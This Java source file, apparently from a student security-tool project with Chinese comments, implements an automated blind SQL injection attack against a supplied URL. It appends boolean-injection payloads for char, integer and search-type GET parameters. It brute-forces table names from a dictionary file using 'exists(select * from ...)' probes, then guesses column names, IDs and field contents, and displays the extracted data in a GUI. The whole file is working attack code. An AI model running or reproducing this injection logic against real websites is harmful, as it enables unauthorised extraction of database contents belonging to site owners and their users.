package cn.edu.neu.MJ.SQLInject;

import java.io.*;
import java.util.ArrayList;
import java.util.List;

import static cn.edu.neu.HJ.GUI.GUIStart.mf;


public class ViolenceFrame {
	private String urlString;
	private String tablename;
	//private Table tab = new Table();
	private WordName fn = new WordName();
	public ViolenceFrame(String ustr,String sqltype) {
		urlString = ustr; // 获取输入的url
		List<String> listtable = null;
		//判断数据库类型
		DBType db = new DBType();
		String dbtype = db.getType(urlString,sqltype);
		System.out.println("数据库类型为：" + dbtype);
		mf.printSQLInjectProcess("数据库类型为：" + dbtype + "\n");
		mf.setDataBaseType(dbtype);
		String head ="";
		String tail = "";
	    if(sqltype.equals("charGet")){//如果get注入为char型，url进行如下处理
	    	head="'";
	    	tail="%20and%20'1'='1";
	    	
	    }else if(sqltype.equals("intGet")){
	    	head = "";
	    	tail = "%20and%201=1";
	    }
	    else if(sqltype.equals("searchGet")){//如果get注入为搜索型，url进行如下处理
	    	    head="%'";
	    	    tail="%20and%20'%'='";
		}
	    GetWebContent gwc=new GetWebContent();
		// 检测表名
        System.out.println("下面检测表名：");

		listtable = new ArrayList<String>();
		File file1=new File("Table.txt");
		BufferedReader bw1 = null;
		try {
			bw1 = new BufferedReader(new FileReader(file1));
		} catch (FileNotFoundException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
    	String str1 = null;
		try {
			str1 = bw1.readLine();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		while(str1!=null)
	    {
    		if (gwc.RepareContent(urlString,urlString+head+"%20and%20exists(select%20*%20from%20"+str1+")"+tail)){
    			
    			//System.out.println("存在"+str1+"表");
	    		listtable.add(str1);	
	    	}
	    	try {
				str1 =bw1.readLine();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
			//System.out.println(str1);
	    }
    	try {
			bw1.close();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
        //TheParam.getParams().sqlInjectTable = listtable;
    	for (int i=0;i<listtable.size();i++){
    		System.out.println("猜解出表名：" + listtable.get(i));
			mf.printSQLInjectProcess("猜解出表名：" + listtable.get(i) + "\n");
			mf.setSQLInjectTabelNameResult( listtable.get(i) + "\n");
    	}
		
		//检测字段
    	System.out.println("下面检测字段名：");
		mf.printSQLInjectProcess("下面检测字段名：" + "\n");
    	List<String> listword = null;
    	for (int k = 0; k < listtable.size(); k++) 
		{	
    		tablename = listtable.get(k);
    		listword = fn.GuessWord(tablename, urlString,sqltype);
			if(listword.size()==0)//字典里没有匹配字段
				System.out.println("没有匹配的字段");
			mf.printSQLInjectProcess("表" + tablename + "中存在以下字段：" + "\n");
			mf.setWordNameResult("表" + tablename + "中存在以下字段：" + "\n");
			mf.setSQLWordResult(tablename+"表\n");
			for (int i=0;i<listword.size();i++){
				System.out.println(listword.get(i));
				mf.printSQLInjectProcess(listword.get(i) + "\n");
				mf.setWordNameResult(listword.get(i) + "\n");
			}
/******************************************8*/
    		
			
			//取出字段名中含有id的字段作为id获取其内容
			String idword=null;
			for (int i = 0; i < listword.size(); i++) {
				if(listword.get(i).toLowerCase().equals("id")){
					idword=listword.get(i);
					break;
				}
				else if(listword.get(i).toLowerCase().indexOf("id")!=-1){
						idword=listword.get(i);
						break;
				}
				else{
					idword="1";
				}
			}
			TableInfo ti = new TableInfo();
			ti.setTablename(tablename);
	    	//获取id内容
			ContentName c = new ContentName();
			int[] id;
			if(!idword.equals("1")){
				id = c.guessID(tablename, idword, urlString,sqltype);
			    for (int i = 0; i < id.length; i++) {/////////////////////////////////////////////////////////////
				    System.out.println("id="+id[i]);
			    }
			    ti.getFieldname().add(idword);
			    for (int i = 0; i < id.length; i++)
			    	ti.getContent().add(String.valueOf(id[i]));
			}
			else{
				id=new int[100];
				for (int i = 0; i < 100; i++) {
					id[i]=1;
				}
			}
			System.out.println("猜解字段内容：");
			mf.printSQLInjectProcess("猜解字段内容：" + "\n");
	        //获取每个字段的内容
			List<ArrayList<String>> list = new ArrayList<ArrayList<String>>();//存储集合的集合
			for (int i = 0; i < listword.size(); i++) {
				if(listword.get(i)==idword){
					i++;
					if(i==listword.size())
						break;
				}
				ArrayList<String> listcontent = c.guseeContent(tablename,
						listword.get(i), urlString, id,idword, dbtype,sqltype);
				mf.printSQLInjectProcess("字段" + listword.get(i) + "的内容：" + "\n");
				mf.setSQLWordResult(listword.get(i) + "字段的内容：" + "\n");
				for (int j=0;j<listcontent.size();j++) {
					System.out.println(listcontent.get(j));
				    mf.printSQLInjectProcess(listcontent.get(j) + "\n");
					mf.setSQLWordResult(listcontent.get(j)+ "\n");
				}
				list.add(listcontent);    //将每个字段的集合加入到list中
			}
	        for (int i=0;i<listword.size();i++)
	        	if (!listword.get(i).equals(idword))
	        		ti.getFieldname().add(listword.get(i));
			mf.setSQLWordResult("\n");
	        for (int i=0;i<list.size();i++)
	        	for (int j=0;j<id.length;j++)
	        		ti.getContent().add(list.get(i).get(j));
		}
	}
	
}
